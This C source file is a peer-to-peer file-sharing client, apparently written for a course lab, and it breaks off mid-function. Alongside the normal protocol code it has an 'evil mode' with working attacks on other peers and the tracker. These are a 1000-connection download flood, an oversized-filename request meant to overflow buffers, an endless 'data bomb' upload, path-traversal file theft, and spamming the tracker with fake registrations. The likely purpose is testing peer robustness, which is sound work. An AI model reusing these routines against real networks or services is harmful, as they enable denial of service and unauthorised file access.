// -*- mode: c++ -*-
#define _BSD_EXTENSION
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdarg.h>
#include <ctype.h>
#include <sys/socket.h>
#include <dirent.h>
#include <netdb.h>
#include <assert.h>
#include <pwd.h>
#include <time.h>
#include <limits.h>
#include "md5.h"
#include "osp2p.h"

#include <sys/poll.h>

int evil_mode;			// nonzero iff this peer should behave badly

static struct in_addr listen_addr;	// Define listening endpoint
static int listen_port;
const char *my_alias;

/*****************************************************************************
 * TASK STRUCTURE
 * Holds all information relevant for a peer or tracker connection, including
 * a bounded buffer that simplifies reading from and writing to peers.
 */

#define TASKBUFSIZ	4096	// Size of task_t::buf
#define FILENAMESIZ	256	// Size of task_t::filename
#define MAXFILESIZ 10485760 //10 megabytes
#define MAX_RETRY 3 //number of max retries
#define DL_RETRY 3 //interval b/t download retries in seconds
#define TIMEOUT 1000 //max milliseconds b/t downloads
#define DDOSNUM 1000 //num of DDOS download entries

typedef enum tasktype {		// Which type of connection is this?
	TASK_TRACKER,		// => Tracker connection
	TASK_PEER_LISTEN,	// => Listens for upload requests
	TASK_UPLOAD,		// => Upload request (from peer to us)
	TASK_DOWNLOAD		// => Download request (from us to peer)
} tasktype_t;

typedef enum download_status
  {
    DOWNLOAD_COMPLETED, //complete
    DOWNLOAD_NO_PEERS,  // no peer's willing to serve file
    DOWNLOAD_TOO_MANY_LOC //too many local files w/ same name
  }download_status_t;

typedef struct peer {		// A peer connection (TASK_DOWNLOAD)
	char alias[TASKBUFSIZ];	// => Peer's alias
	struct in_addr addr;	// => Peer's IP address
	int port;		// => Peer's port number
	struct peer *next;
} peer_t;

typedef struct task {
	tasktype_t type;	// Type of connection

	int peer_fd;		// File descriptor to peer/tracker, or -1
	int disk_fd;		// File descriptor to local file, or -1

	char *buf;	// Bounded buffer abstraction
        size_t buf_size;
	unsigned head;
	unsigned tail;
	size_t total_written;	// Total number of bytes written
				// by write_to_taskbuf

	char filename[FILENAMESIZ];	// Requested filename
	char disk_filename[FILENAMESIZ]; // Local filename (TASK_DOWNLOAD)
  char md5_checksum[MD5_TEXT_DIGEST_MAX_SIZE + 1]; //tracker checksum
	peer_t *peer_list;	// List of peers that have 'filename'
				// (TASK_DOWNLOAD).  The task_download
				// function initializes this list;
				// task_pop_peer() removes peers from it, one
				// at a time, if a peer misbehaves.
} task_t;


// task_new(type)
//	Create and return a new task of type 'type'.
//	If memory runs out, returns NULL.
static task_t *task_new(tasktype_t type)
{
	task_t *t = (task_t *) malloc(sizeof(task_t));
	if (!t) {
		errno = ENOMEM;
		return NULL;
	}

	t->type = type;
	t->peer_fd = t->disk_fd = -1;
	t->head = t->tail = 0;
	t->total_written = 0;
	t->peer_list = NULL;

	strcpy(t->filename, "");
	strcpy(t->disk_filename, "");

	t->buf = (char *)malloc(sizeof(char) * TASKBUFSIZ);
	t->buf_size = TASKBUFSIZ;
	memset(t->buf, 0, TASKBUFSIZ);

	return t;
}

// task_pop_peer(t)
//	Clears the 't' task's file descriptors and bounded buffer.
//	Also removes and frees the front peer description for the task.
//	The next call will refer to the next peer in line, if there is one.
static void task_pop_peer(task_t *t)
{
	if (t) {
		// Close the file descriptors and bounded buffer
		if (t->peer_fd >= 0)
			close(t->peer_fd);
		if (t->disk_fd >= 0)
			close(t->disk_fd);
		t->peer_fd = t->disk_fd = -1;
		t->head = t->tail = 0;
		t->total_written = 0;
		t->disk_filename[0] = '\0';

		// Move to the next peer
		if (t->peer_list) {
			peer_t *n = t->peer_list->next;
			free(t->peer_list);
			t->peer_list = n;
		}
	}
}

// task_free(t)
//	Frees all memory and closes all file descriptors relative to 't'.
static void task_free(task_t *t)
{
	if (t) {
		do {
			task_pop_peer(t);
		} while (t->peer_list);
		free(t->buf);
		free(t);
	}
}


/******************************************************************************
 * TASK BUFFER
 * A bounded buffer for storing network data on its way into or out of
 * the application layer.
 */

typedef enum taskbufresult {		// Status of a read or write attempt.
	TBUF_ERROR = -1,		// => Error; close the connection.
	TBUF_END = 0,			// => End of file, or buffer is full.
	TBUF_OK = 1,			// => Successfully read data.
	TBUF_AGAIN = 2			// => Did not read data this time.  The
					//    caller should wait.
} taskbufresult_t;

// read_to_taskbuf(fd, t)
//	Reads data from 'fd' into 't->buf', t's bounded buffer, either until
//	't's bounded buffer fills up, or no more data from 't' is available,
//	whichever comes first.  Return values are TBUF_ constants, above;
//	generally a return value of TBUF_AGAIN means 'try again later'.
//	The task buffer is capped at TASKBUFSIZ.
taskbufresult_t read_to_taskbuf(int fd, task_t *t)
{
	unsigned headpos = (t->head % t->buf_size);
	unsigned tailpos = (t->tail % t->buf_size);
	ssize_t amt;

	if (t->head == t->tail || headpos < tailpos)
	  amt = read(fd, &t->buf[tailpos], t->buf_size - tailpos);
	else
		amt = read(fd, &t->buf[tailpos], headpos - tailpos);

	if (amt == -1 && (errno == EINTR || errno == EAGAIN
			  || errno == EWOULDBLOCK))
		return TBUF_AGAIN;
	else if (amt == -1)
		return TBUF_ERROR;
	else if (amt == 0)
		return TBUF_END;
	else {
		t->tail += amt;
		return TBUF_OK;
	}
}


// write_from_taskbuf(fd, t)
//	Writes data from 't' into 't->fd' into 't->buf', using similar
//	techniques and identical return values as read_to_taskbuf.
taskbufresult_t write_from_taskbuf(int fd, task_t *t)
{
	unsigned headpos = (t->head % t->buf_size);
	unsigned tailpos = (t->tail % t->buf_size);
	ssize_t amt;

	if (t->head == t->tail)
		return TBUF_END;
	else if (headpos < tailpos)
		amt = write(fd, &t->buf[headpos], tailpos - headpos);
	else
		amt = write(fd, &t->buf[headpos], t->buf_size - headpos);

	if (amt == -1 && (errno == EINTR || errno == EAGAIN
			  || errno == EWOULDBLOCK))
		return TBUF_AGAIN;
	else if (amt == -1)
		return TBUF_ERROR;
	else if (amt == 0)
		return TBUF_END;
	else {
		t->head += amt;
		t->total_written += amt;
		return TBUF_OK;
	}
}


/******************************************************************************
 * NETWORKING FUNCTIONS
 */

// open_socket(addr, port)
//	All the code to open a network connection to address 'addr'
//	and port 'port' (or a listening socket on port 'port').
int open_socket(struct in_addr addr, int port)
{
	struct sockaddr_in saddr;
	socklen_t saddrlen;
	int fd, ret, yes = 1;

	if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1
	    || fcntl(fd, F_SETFD, FD_CLOEXEC) == -1
	    || setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
		goto error;

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_family = AF_INET;
	saddr.sin_addr = addr;
	saddr.sin_port = htons(port);

	if (addr.s_addr == INADDR_ANY) {
		if (bind(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1
		    || listen(fd, 4) == -1)
			goto error;
	} else {
		if (connect(fd, (struct sockaddr *) &saddr, sizeof(saddr)) == -1)
			goto error;
	}

	return fd;

    error:
	if (fd >= 0)
		close(fd);
	return -1;
}


/******************************************************************************
 * THE OSP2P PROTOCOL
 * These functions manage connections to the tracker and connections to other
 * peers.  They generally use and return 'task_t' objects, which are defined
 * at the top of this file.
 */

// read_tracker_response(t)
//	Reads an RPC response from the tracker using read_to_taskbuf().
//	An example RPC response is the following:
//
//      FILE README                             \ DATA PORTION
//      FILE osptracker.cc                      | Zero or more lines.
//      ...                                     |
//      FILE writescan.o                        /
//      200-This is a context line.             \ MESSAGE PORTION
//      200-This is another context line.       | Zero or more CONTEXT lines,
//      ...                                     | which start with "###-", and
//      200 Number of registered files: 12      / then a TERMINATOR line, which
//                                                starts with "### ".
//                                                The "###" is an error code:
//                                                200-299 indicate success,
//                                                other codes indicate error.
//
//	This function empties the task buffer, then reads into it until it
//	finds a terminator line.  It returns the number of characters in the
//	data portion.  It also terminates this client if the tracker's response
//	is formatted badly.  (This code trusts the tracker.)
static size_t read_tracker_response(task_t *t)
{
	char *s;
	size_t split_pos = (size_t) -1, pos = 0;
	t->head = t->tail = 0;

	while (1) {
		// Check for whether buffer is complete.
		for (; pos+3 < t->tail; pos++)
			if ((pos == 0 || t->buf[pos-1] == '\n')
			    && isdigit((unsigned char) t->buf[pos])
			    && isdigit((unsigned char) t->buf[pos+1])
			    && isdigit((unsigned char) t->buf[pos+2])) {
				if (split_pos == (size_t) -1)
					split_pos = pos;
				if (pos + 4 >= t->tail)
					break;
				if (isspace((unsigned char) t->buf[pos + 3])
				    && t->buf[t->tail - 1] == '\n') {
					t->buf[t->tail] = '\0';
					return split_pos;
				}
			}

		// If not, read more data.  Note that the read will not block
		// unless NO data is available.
		int ret = TBUF_OK;
		do
		  {
		    if(t->tail == t->buf_size)
		      {
			message("* Resizing task buf from %zu\n", t->buf_size);
			t->buf_size *= 2;
			t->buf = (char *) realloc(t->buf, t->buf_size);
		      }
		    ret = read_to_taskbuf(t->peer_fd, t);
		    if(ret == TBUF_ERROR)
		      die("Tracker read error.");
		    else if(ret == TBUF_END && t->tail != t->buf_size)
		      die("Tracker connection closed prematurely.\n");

		  }while(ret == TBUF_END && t->tail == t->buf_size);
	}
}


// start_tracker(addr, port)
//	Opens a connection to the tracker at address 'addr' and port 'port'.
//	Quits if there's no tracker at that address and/or port.
//	Returns the task representing the tracker.
task_t *start_tracker(struct in_addr addr, int port)
{
	struct sockaddr_in saddr;
	socklen_t saddrlen;
	task_t *tracker_task = task_new(TASK_TRACKER);
	size_t messagepos;

	if ((tracker_task->peer_fd = open_socket(addr, port)) == -1)
		die("cannot connect to tracker");

	// Determine our local address as seen by the tracker.
	saddrlen = sizeof(saddr);
	if (getsockname(tracker_task->peer_fd,
			(struct sockaddr *) &saddr, &saddrlen) < 0)
		error("getsockname: %s\n", strerror(errno));
	else {
		assert(saddr.sin_family == AF_INET);
		listen_addr = saddr.sin_addr;
	}

	// Collect the tracker's greeting.
	messagepos = read_tracker_response(tracker_task);
	message("* Tracker's greeting:\n%s", &tracker_task->buf[messagepos]);

	return tracker_task;
}


// start_listen()
//	Opens a socket to listen for connections from other peers who want to
//	upload from us.  Returns the listening task.
task_t *start_listen(void)
{
	struct in_addr addr;
	task_t *t;
	int fd;
	addr.s_addr = INADDR_ANY;

	// Set up the socket to accept any connection.  The port here is
	// ephemeral (we can use any port number), so start at port
	// 11112 and increment until we can successfully open a port.
	for (listen_port = 11112; listen_port < 13000; listen_port++)
		if ((fd = open_socket(addr, listen_port)) != -1)
			goto bound;
		else if (errno != EADDRINUSE)
			die("cannot make listen socket");

	// If we get here, we tried about 200 ports without finding an
	// available port.  Give up.
	die("Tried ~200 ports without finding an open port, giving up.\n");

    bound:
	message("* Listening on port %d\n", listen_port);

	t = task_new(TASK_PEER_LISTEN);
	t->peer_fd = fd;
	return t;
}

//calculate MD5sum
static char *md5_digest(const char *fname)
{
  md5_state_t *state = (md5_state_t *) malloc(sizeof(md5_state_t));
  char *text_digest = (char *) malloc(sizeof(char) * (MD5_TEXT_DIGEST_MAX_SIZE + 1));
  md5_byte_t buffer[1024];

  //file size
  FILE *f;
  f = fopen(fname, "r");
  int read_bytes = 0;

  md5_init(state);

  while((read_bytes = fread(buffer, 1, 1024, f)) > 0)
    {
      md5_append(state,buffer, read_bytes);
    }
  fclose(f);

  int p = md5_finish_text(state, text_digest, 1);
  text_digest[p] = 0;

  free(state);
  return text_digest;
}

// register_files(tracker_task, myalias)
//	Registers this peer with the tracker, using 'myalias' as this peer's
//	alias.  Also register all files in the current directory, allowing
//	other peers to upload those files from us.
static void register_files(task_t *tracker_task, const char *myalias)
{
	DIR *dir;
	struct dirent *ent;
	struct stat s;
	char buf[PATH_MAX];
	size_t messagepos;
	assert(tracker_task->type == TASK_TRACKER);

	// Register address with the tracker.
	osp2p_writef(tracker_task->peer_fd, "ADDR %s %I:%d\n",
		     myalias, listen_addr, listen_port);
	messagepos = read_tracker_response(tracker_task);
	message("* Tracker's response to our IP address registration:\n%s",
		&tracker_task->buf[messagepos]);
	if (tracker_task->buf[messagepos] != '2') {
		message("* The tracker reported an error, so I will not register files with it.\n");
		return;
	}

	// Register files with the tracker.
	message("* Registering our files with tracker\n");
	if ((dir = opendir(".")) == NULL)
		die("open directory: %s", strerror(errno));
	while ((ent = readdir(dir)) != NULL) {
		int namelen = strlen(ent->d_name);

		// don't depend on unreliable parts of the dirent structure
		// and only report regular files.  Do not change these lines.
		if (stat(ent->d_name, &s) < 0 || !S_ISREG(s.st_mode)
		    || (namelen > 2 && ent->d_name[namelen - 2] == '.'
			&& (ent->d_name[namelen - 1] == 'c'
			    || ent->d_name[namelen - 1] == 'h'))
		    || (namelen > 1 && ent->d_name[namelen - 1] == '~'))
			continue;

		char *chcksum = md5_digest(ent->d_name);
		osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name, chcksum);
		messagepos = read_tracker_response(tracker_task);
		if (tracker_task->buf[messagepos] != '2')
			error("* Tracker error message while registering '%s':\n%s",
			      ent->d_name, &tracker_task->buf[messagepos]);
		if(evil_mode)
		  {
		    osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", ent->d_name);
		    messagepos = read_tracker_response(tracker_task);
		    if(tracker_task->buf[messagepos] != '2')
		      {
			error("* Tracker error message while registering '%s':\n%s", ent->d_name, &tracker_task->buf[messagepos]);
		      }
		  }
		free(chcksum);
	}

	closedir(dir);
}


// parse_peer(s, len)
//	Parse a peer specification from the first 'len' characters of 's'.
//	A peer specification looks like "PEER [alias] [addr]:[port]".
static peer_t *parse_peer(const char *s, size_t len)
{
	peer_t *p = (peer_t *) malloc(sizeof(peer_t));
	if (p) {
		p->next = NULL;
		if(len > TASKBUFSIZ)
		  {
		    error("* Ignoring peer: alias too long: %s\n", s);
		  }
		else if (osp2p_snscanf(s, len, "PEER %s %I:%d",
				  p->alias, &p->addr, &p->port) >= 0
		    && p->port > 0 && p->port <= 65535)
			return p;
	}
	free(p);
	return NULL;
}

//who
//return a task for contacting peers. contacts tracker for list of online peers
task_t *who(task_t *trac_task)
{
  char *a, *b;
  task_t *t = NULL;
  peer_t *p;
  size_t msg_pos;
  assert(trac_task->type == TASK_TRACKER);

  message("* FInding peers from WHO.\n");

  osp2p_writef(trac_task->peer_fd, "WHO \n");
  msg_pos = read_tracker_response(trac_task);
  message("* WHO response: %s", &trac_task->buf[msg_pos]);
  if(trac_task->buf[msg_pos] != '2')
    {
      error("* Tracker error message while running WHO:\n%s", &trac_task->buf[msg_pos]);
      goto exit;
    }
  if(!(t = task_new(TASK_DOWNLOAD)))
    {
      error("* Error while allocating task.");
      goto exit;
    }
  strcpy(t->filename, "");

  a = trac_task->buf;
  while((b = memchr(a, '\n', (trac_task->buf + msg_pos) - a)))
    {
      if(!(p = parse_peer(a, b - a)))
	die("osptracker responded to WHO command with unexpected format.\n");
      char p_address[FILENAMESIZ],l_address[FILENAMESIZ];
      if(strcmp(p->alias, my_alias) != 0)
	{
	  p->next = t->peer_list;
	  t->peer_list = p;
	}
      a = b + 1;
    }
  if(a != trac_task->buf + msg_pos)
    die("osptracker response to WHO has unexpected format.\n");

 exit:
  return t;
}

// start_download(tracker_task, filename)
//	Return a TASK_DOWNLOAD task for downloading 'filename' from peers.
//	Contacts the tracker for a list of peers that have 'filename',
//	and returns a task containing that peer list.
task_t *start_download(task_t *tracker_task, const char *filename)
{
	char *s1, *s2;
	task_t *t = NULL;
	peer_t *p;
	size_t messagepos;
	assert(tracker_task->type == TASK_TRACKER);

	message("* Finding peers for '%s'\n", filename);

	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
	messagepos = read_tracker_response(tracker_task);
	message("* WANT %s response: %s", filename, &tracker_task->buf[messagepos]);
	if (tracker_task->buf[messagepos] != '2') {
		error("* Tracker error message while requesting '%s':\n%s",
		      filename, &tracker_task->buf[messagepos]);
		goto exit;
	}

	if (!(t = task_new(TASK_DOWNLOAD))) {
		error("* Error while allocating task");
		goto exit;
	}
	if(strlen(filename) > FILENAMESIZ)
	  {
	    error("* filename %s is too long.\n", filename);
	    goto exit;
	  }
	strcpy(t->filename, filename);

	// add peers
	s1 = tracker_task->buf;
	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
		if (!(p = parse_peer(s1, s2 - s1)))
			die("osptracker responded to WANT command with unexpected format!\n");
		p->next = t->peer_list;
		t->peer_list = p;
		s1 = s2 + 1;
	}
	if (s1 != tracker_task->buf + messagepos)
		die("osptracker's response to WANT has unexpected format!\n");

	osp2p_writef(tracker_task->peer_fd, "MD5SUM %s\n", filename);
	messagepos = read_tracker_response(tracker_task);
	if(tracker_task->buf[messagepos] == '2' && messagepos > 0)
	  {
	    if((messagepos - 1) > MD5_TEXT_DIGEST_MAX_SIZE)
	      {
		error("* MD5SUM is too long: %s\n", tracker_task->buf);
		goto exit;
	      }
	    strncpy(t->md5_checksum, tracker_task->buf, messagepos - 1);
	    t->md5_checksum[messagepos - 1] = 0;
	    message("* Parsed MD5SUM for '%s': %s\n", filename, t->md5_checksum);
	  }
	else
	  t->md5_checksum[0] = 0;

 exit:
	return t;
}

static int ddos_download(task_t *t, task_t *trac_task)
{
  message("* Begin ddos_download\n");
  int x;
  assert((!t || t->type == TASK_DOWNLOAD) && trac_task->type == TASK_TRACKER);

  if(!t || !t->peer_list)
    {
      error("* No peers willing to serve '%s'\n", (t ? t->filename : "that file"));
      task_free(t);
      return DOWNLOAD_NO_PEERS;
    }
  else if(t->peer_list->addr.s_addr == listen_addr.s_addr
	  && t->peer_list->port == listen_port)
    return 0;

  int DDOSval = 0;
  do
    {
      message("* [%i] Connecting to %s %s:%d to download '%s'\n", DDOSval, t->peer_list->alias, inet_ntoa(t->peer_list->addr), t->peer_list->port, t->filename);
      t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
      if(t->peer_fd == -1)
	{
	  error("* Cannot connect to pper: %s\n", strerror(errno));
	  return 0;
	}
      osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
      DDOSval++;
    }while(DDOSval < DDOSNUM);
  return 0;
}

// task_download(t, tracker_task)
//	Downloads the file specified by the input task 't' into the current
//	directory.  't' was created by start_download().
//	Starts with the first peer on 't's peer list, then tries all peers
//	until a download is successful.
static int task_download(task_t *t, task_t *tracker_task)
{
	int i, ret = -1;
	assert((!t || t->type == TASK_DOWNLOAD)
	       && tracker_task->type == TASK_TRACKER);

	// Quit if no peers, and skip this peer
	if (!t || !t->peer_list) {
		error("* No peers are willing to serve '%s'\n",
		      (t ? t->filename : "that file"));
		task_free(t);
		return DOWNLOAD_NO_PEERS;
	} else if (t->peer_list->addr.s_addr == listen_addr.s_addr
		   && t->peer_list->port == listen_port)
		goto try_again;

	// Connect to the peer and write the GET command
	message("* Connecting to %s %s:%d to download '%s'\n", t->peer_list->alias,
		inet_ntoa(t->peer_list->addr), t->peer_list->port,
		t->filename);
	t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
	if (t->peer_fd == -1) {
		error("* Cannot connect to peer: %s\n", strerror(errno));
		goto try_again;
	}
	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);

	// Open disk file for the result.
	// If the filename already exists, save the file in a name like
	// "foo.txt~1~".  However, if there are 50 local files, don't download
	// at all.
	char req_file[FILENAMESIZ];
	strcpy(req_file, t->filename);
	if(evil_mode && strstr(req_file, "../") == req_file)
	  strncpy(req_file, "st_", 3);
	for (i = 0; i < 50; i++) {
		if (i == 0)
			strcpy(t->disk_filename, req_file);
		else
			sprintf(t->disk_filename, "%s~%d~", req_file, i);
		t->disk_fd = open(t->disk_filename,
				  O_WRONLY | O_CREAT | O_EXCL, 0666);
		if (t->disk_fd == -1 && errno != EEXIST) {
			error("* Cannot open local file");
			goto try_again;
		} else if (t->disk_fd != -1) {
			message("* Saving result to '%s'\n", t->disk_filename);
			break;
		}
	}
	if (t->disk_fd == -1) {
		error("* Too many local files like '%s' exist already.\n\
* Try 'rm %s.~*~' to remove them.\n", t->filename, t->filename);
		task_free(t);
		return DOWNLOAD_TOO_MANY_LOC;
	}

	struct pollfd p;
	int pollr;
	p.fd = t->peer_fd;
	p.events = POLLIN | POLLERR | POLLHUP | POLLNVAL;

	// Read the file into the task buffer from the peer,
	// and write it from the task buffer onto disk.
	while (1) {
	  if(t->total_written > MAXFILESIZ)
	    {
	      error("* Error: file [%s] exceeded size limit [%i bytes]! \n", t->filename, MAXFILESIZ);
	      goto try_again;
	    }
	  pollr = poll(&p, 1, TIMEOUT);
	  if(pollr == 0)
	    {
	      error("* Download '%s' too slow; moving onto next peer\n", t->filename);
	      goto try_again;
	    }
		int ret = read_to_taskbuf(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Peer read error");
			goto try_again;
		} else if (ret == TBUF_END && t->head == t->tail)
			/* End of file */
			break;

		ret = write_from_taskbuf(t->disk_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Disk write error");
			goto try_again;
		}
	}

	// Empty files are usually a symptom of some error.
	if (t->total_written > 0) {
	  char *chcksum = md5_digest(t->disk_filename);
		message("* Downloaded '%s' was %lu bytes long\n",
			t->disk_filename, (unsigned long) t->total_written, chcksum);

		if(strlen(t->md5_checksum) > 0 &&
		   strcmp(t->disk_filename, t->filename) == 0)
		  {
		    if(strcmp(t->md5_checksum, chcksum) == 0)
		      free(chcksum);
		    else
		      {
			error("* MD5 verif of '%s:%s' failed.\n", t->filename, t->md5_checksum);
			free(chcksum);
			goto try_again;
		      }
		  }
		else
		  {
		    strcpy(t->md5_checksum, chcksum);
		    free(chcksum);
		  }

		// Inform the tracker that we now have the file,
		// and can serve it to others!  (But ignore tracker errors.)
		if (strcmp(t->filename, t->disk_filename) == 0) {
			osp2p_writef(tracker_task->peer_fd, "HAVE %s %s\n",
				     t->filename, t->md5_checksum);
			(void) read_tracker_response(tracker_task);
		}
		task_free(t);
		return DOWNLOAD_COMPLETED;
	}
	error("* Download '%s' was empty, trying next peer\n", t->filename);

    try_again:
	if (t->disk_filename[0])
		unlink(t->disk_filename);
	// recursive call
	task_pop_peer(t);
	return task_download(t, tracker_task);
}


// task_listen(listen_task)
//	Accepts a connection from some other peer.
//	Returns a TASK_UPLOAD task for the new connection.
static task_t *task_listen(task_t *listen_task)
{
	struct sockaddr_in peer_addr;
	socklen_t peer_addrlen = sizeof(peer_addr);
	int fd;
	task_t *t;
	assert(listen_task->type == TASK_PEER_LISTEN);

	fd = accept(listen_task->peer_fd,
		    (struct sockaddr *) &peer_addr, &peer_addrlen);
	if (fd == -1 && (errno == EINTR || errno == EAGAIN
			 || errno == EWOULDBLOCK))
		return NULL;
	else if (fd == -1)
		die("accept");

	message("* Got connection from %s:%d\n",
		inet_ntoa(peer_addr.sin_addr), ntohs(peer_addr.sin_port));

	t = task_new(TASK_UPLOAD);
	t->peer_fd = fd;
	return t;
}

//file_exists(file)
//returns 1 if file is in current directory, else 0
static int file_exists(const char *f)
{
  DIR *directory;
  struct dirent *ent;
  struct stat st;
  message("* Searching directory for the requested file %s\n", f);
  if((directory = opendir(".")) == NULL)
    die("open directory: %s", strerror(errno));
  while((ent = readdir(directory)) != NULL)
    {
      int namelength = strlen(ent->d_name);

      if(stat(ent->d_name, &st) < 0 || !S_ISREG(st.st_mode)
	 || (namelength > 2 && ent->d_name[namelength - 2] == '.'
	     && (ent->d_name[namelength - 1] == 'c'
		 || ent->d_name[namelength - 1] == 'h')) 
	 || (namelength > 1 && ent->d_name[namelength - 1] == '~'))
	{}
      else if(strcmp(ent->d_name, f) == 0)
	return 1;
    }
  closedir(directory);
  return 0;
}

// task_upload(t)
//	Handles an upload request from another peer.
//	First reads the request into the task buffer, then serves the peer
//	the requested file.
static void task_upload(task_t *t)
{
	assert(t->type == TASK_UPLOAD);
	// First, read the request from the peer.
	while (1) {
		int ret = read_to_taskbuf(t->peer_fd, t);
		message("* READ task_upload request: %s\n", t->buf);
		if (ret == TBUF_ERROR) {
			error("* Cannot read from connection");
			goto exit;
		} else if (ret == TBUF_END
			   || (t->tail && t->buf[t->tail-1] == '\n'))
			break;
	}

	assert(t->head == 0);
	if(t->tail > (4 + FILENAMESIZ + 7))
	  {
	    error("* Filename is too long.\n");
	    goto exit;
	  }
	if (osp2p_snscanf(t->buf, t->tail, "GET %s OSP2P\n", t->filename) < 0) {
		error("* Odd request %.*s\n", t->tail, t->buf);
		goto exit;
	}
	t->head = t->tail = 0;

	int existing = file_exists(t->filename);
	int infin = 0;

	//send infinite data bomb if in evil mode 
	if(!existing && evil_mode)
	  {
	    error("* Evilmode replacing missing file with evil pussy\n", t->filename);
	    strcpy(t->filename, "../evilpussy.jpg");
	  }
	else if(!existing)
	  {
	    error("* File %s does not exist in directory \n", t->filename);
	    goto exit;
	  }
	else if(evil_mode && existing)
	  {
	    int random = rand()%2;
	    if(random == 0)
	      {
		infin = 1;
		message("* Turning on infinite data bomb.\n");
	      }
	    else if(random == 1)
	      {
		strcpy(t->filename, "../evilpussy.jpg");
		message("* Sending wrong file.\n");
	      }
	  }
	t->disk_fd = open(t->filename, O_RDONLY);
	if (t->disk_fd == -1) {
		error("* Cannot open file %s", t->filename);
		goto exit;
	}

	message("* Transferring file %s\n", t->filename);
	// Now, read file from disk and write it to the requesting peer.
	while (1) {
	  unsigned begin = t->head;
		int ret = write_from_taskbuf(t->peer_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Peer write error");
			goto exit;
		}

		ret = read_to_taskbuf(t->disk_fd, t);
		if (ret == TBUF_ERROR) {
			error("* Disk read error");
			goto exit;
		} else if (ret == TBUF_END && t->head == t->tail && !infin)
			/* End of file */
			break;
		else if(ret == TBUF_END && t->head == t->tail && infin)
		  t->head = begin;
	}

	message("* Upload of %s complete\n", t->filename);

    exit:
	task_free(t);
}

static void upload_files(task_t *listen_t)
{
  struct sockaddr_in peer_address;
  socklen_t peer_addrlength = sizeof(peer_address);
  fd_set master_set, set;
  FD_ZERO(&master_set);
  FD_ZERO(&set);
  FD_SET(listen_t->peer_fd, &master_set);
  int max_fd = listen_t->peer_fd + 1;

  int task_number = 0;
  while(1)
    {
      set = master_set;
      int sel = select(max_fd, &set, NULL, NULL, NULL);
      if(sel < 0)
	error("* select failed.\n");
      else
	{
	  int fd;
	  for(fd = 0; fd <= max_fd; fd++)
	    {
	      if(FD_ISSET(fd, &set))
		{
		  if(fd == listen_t->peer_fd)
		    {
		      int chil = fork();
		      if(chil == 0)
			{
			  task_t *t = task_listen(listen_t);
			  task_upload(t);
			  exit(0);
			}
		      else if(chil < 0)
			error("* upload_files: Unable to generate child proc.\n");
		    }
		}
	    }
	}
    }
}

static void steal_file(task_t *trac_task, const char *f)
{
  task_t *t;
  if((t = who(trac_task)))
    {
      int chil = fork();
      if(chil == 0)
	{
	  strcpy(t->filename, f);
	  task_download(t, trac_task);
	  exit(0);
	}
      else if(chil < 0)
	die("* Error creating child proc.\n");
    }
  return;
}

static void overload_request(task_t *trac_task)
{
  task_t *t;
  t = who(trac_task);

  message("* Beginning file length overload req.\n");
  while(t && t->peer_list)
    {
      message("* Connecting to %s %s:%d to request a long file\n", t->peer_list->alias, inet_ntoa(t->peer_list->addr), t->peer_list->port);
      t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
      if(t->peer_fd == -1)
	error("* Cannot connect to peer %s: %s:\n", t->peer_list->alias, strerror(errno));
      else
	osp2p_writef(t->peer_fd, "GET wowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwowwow OSP2P\n", t->filename);
      task_pop_peer(t);
    }
  task_free(t);
  return;
}

//spam the tracker md5 record using filenames from dictionary
//generates count num for spam entries
static void spam_md5(task_t *trac_task, const char* dict, int cnt)
{
  message("* Spam tracker with filenames and md5 values\n");

  int a;
  char fname[80];
  char name[70] = {"\0"};
  FILE *f;
  f = fopen(dict, "r");

  if(f == NULL)
    {
      message("* Dictionary not found.\n");
      return;
    }

  while(fscanf(f, "%s", name) != EOF)
    {
      sprintf(fname, "%s.jpg",name);
      osp2p_writef(trac_task->peer_fd, "HAVE %s %s\n",
		   fname, "Q3mAe3djcNCDKaXVj3AF7c");
      osp2p_writef(trac_task->peer_fd, "DONTHAVE %s \n", fname);
      (void) read_tracker_response(trac_task);

      for(a = 1; a <= cnt; a++)
	{
	  sprintf(fname, "%s%d.jpg", name, a);
	  osp2p_writef(trac_task->peer_fd, "HAVE %s %s\n",
